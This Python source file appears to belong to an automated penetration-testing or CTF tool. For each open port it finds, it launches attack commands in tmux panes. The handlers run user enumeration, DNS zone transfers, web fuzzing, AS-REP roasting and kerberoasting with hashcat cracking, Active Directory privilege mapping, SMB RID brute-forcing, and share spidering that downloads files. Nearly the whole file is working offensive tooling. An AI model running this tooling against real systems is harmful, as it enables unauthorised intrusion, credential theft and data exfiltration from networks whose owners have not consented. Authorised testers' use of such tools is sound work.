from impacket.ldap import ldap
from libtmux.pane import PaneDirection

from utils.logger import write_log
from utils.smb import enumerate_smb_shares
from utils.tmux import initialize_pane

SPRAYABLE_PORTS = {21: "ftp", 22: "ssh", 111: "nfs", 135: "wmi", 389: "ldap", 445: "smb", 1433: "mssql", 3389: "rdp", 5900: "vnc", 5985: "winrm"}

class PortHandlerRegistry:
    def __init__(self):
        self.port_handlers = {}

    def register_port_handler(self, *ports):
        def decorator(func):
            for port in ports:
                self.port_handlers.setdefault(port, []).append(func)
            return func
        return decorator

port_registry = PortHandlerRegistry()

def handle_task(context, port):
    """Main entry point for port handling"""
    port = int(port)
    if port in SPRAYABLE_PORTS:
        context.sprayable_ports[port] = SPRAYABLE_PORTS[port]
    if port in port_registry.port_handlers:
        for task_handler in port_registry.port_handlers[port]:
            task_handler(context)

def run_task(context, command):
    target_pane = prepare_task_pane(context)
    if target_pane:
        if "nxc" in command:
            target_pane.send_keys(f"sleep 6; {command}") # Prevents NetBIOSTimeout exception
        else:
            target_pane.send_keys(f"sleep {context.current_task_pane}; {command}")
    else:
        write_log(context.log_file, f"Failed to create pane for task: {command}")

def stage_task(context, command):
    target_pane = prepare_task_pane(context)
    if target_pane:
        target_pane.send_keys(command, enter=False)

def prepare_task_pane(context):
    if (context.current_task_window is None or 
        context.current_task_pane > 5):
        # Create a new task window
        window_name = f"tasks{context.task_window_count}"
        new_window = context.session.new_window(
            window_name=window_name, 
            attach=False
        )
        # Split into 6 panes (5 splits)
        pane = new_window.attached_pane
        for _ in range(2):
            pane = pane.split()
            pane = pane.split(direction=PaneDirection.Right)
        pane = pane.split()
        new_window.select_layout('tiled')
        for pane in new_window.panes:
            initialize_pane(pane)
        # Update session tracking
        context.current_task_window = new_window
        context.task_window_count += 1
        context.current_task_pane = 0
    # Get the next available pane
    panes = context.current_task_window.panes
    if context.current_task_pane < len(panes):
        target_pane = panes[context.current_task_pane]
        context.current_task_pane += 1
        return target_pane
    return None

# @port_registry.register_port_handler()
# def proto_tasks(context):
#     run_task(context, f"")

@port_registry.register_port_handler(21)
def proto_tasks(context):
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        if passwd:
            run_task(context, f"nxc ftp {context.ip} -u {user} -p '{passwd}'")

@port_registry.register_port_handler(53)
def dns_tasks(context):
    run_task(context, f"dig axfr @{context.ip} {context.domain}")

@port_registry.register_port_handler(80)
def http_tasks(context):
    if context.vhost:
        target = context.vhost or context.domain
        run_task(context, f"firefox 'http://{target}' &; disown; ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target} -H 'Host: FUZZ.{target}' -ac; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ")
    else:
        target = context.ip
        run_task(context, f"firefox 'http://{target}' &; disown; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ")
    run_task(context, f"wpscan --url http://{target} --detection-mode aggressive -e ap,u; wpscan --url http://{target} --detection-mode aggressive -e ap,u --plugins-detection aggressive -o wpscan_long.out")

@port_registry.register_port_handler(88)
def kerberos_tasks(context):
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        run_task(context, f"sudo ntpdate {context.ip}; getTGT.py {context.domain}/{user}:'{passwd}'")
    run_task(context, f"sudo ntpdate {context.ip}; kerbrute userenum -d {context.domain} --dc {context.ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")

@port_registry.register_port_handler(389)
def ldap_tasks(context):
    context.is_ad = True
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        run_task(context, f"rusthound -d {context.domain} -u {user}@{context.domain} -p '{passwd}' -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; nxc ldap {context.ip} -u {user} -p '{passwd}' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
        run_task(context, f"bloodyAD --host {context.hostname}.{context.domain} -d {context.domain} -u {user} -p '{passwd}' get writable; certipy find -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout")
    else:
        # Check anonymous bind
        ldap_conn = ldap.LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
        try:
            ldap_conn.login("","")
            write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
            run_task(context, f"nxc ldap {context.ip} -u '' -p '' --users --find-delegation --trusted-for-delegation --kerberoasting hashes.kerberoast; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
        except Exception as e:
            return

@port_registry.register_port_handler(443)
def proto_tasks(context):
    fqdn = context.vhost or context.domain or context.ip
    run_task(context, f"firefox 'https://{fqdn}' &; disown; curl -k https://{fqdn}; curl -Ik https://{fqdn}")

@port_registry.register_port_handler(445)
def smb_tasks(context):
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        run_task(context, f"nxc smb {context.ip} -u {user} -p '{passwd}' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt; cat users.txt")
    else:
        run_task(context, f"nxc smb {context.ip} -u '' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; nxc smb {context.ip} -u 'a' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt; cat users.txt")
    shares, method = enumerate_smb_shares(context)
    if shares:
        for share in shares:
            if share['name'] not in ['ADMIN$', 'C$', 'Users', 'IPC$', 'NETLOGON', 'SYSVOL']:
                write_log(context.log_file, f"Found non-default share: {share['name']} ({', '.join(share['access'])} privileges)", "SUCCESS")
                if method == 'user/pass':
                    run_task(context, f"nxc smb {context.ip} -u {user} -p '{passwd}' --spider '{share['name']}' --regex . --depth 2; nxc smb {context.ip} -u {user} -p '{passwd}' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'")
                elif method == 'null':
                    run_task(context, f"nxc smb {context.ip} -u '' -p '' --spider '{share['name']}' --regex . --depth 2; nxc smb {context.ip} -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'")
                elif method == 'guest':
                    run_task(context, f"nxc smb {context.ip} -u 'a' -p '' --spider '{share['name']}' --regex . --depth 2; nxc smb {context.ip} -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'")
            if 'WRITE' in share['access']:
                write_log(context.log_file, f"Found writeable share: {share['name']} ({', '.join(share['access'])} privileges)", "SUCCESS")
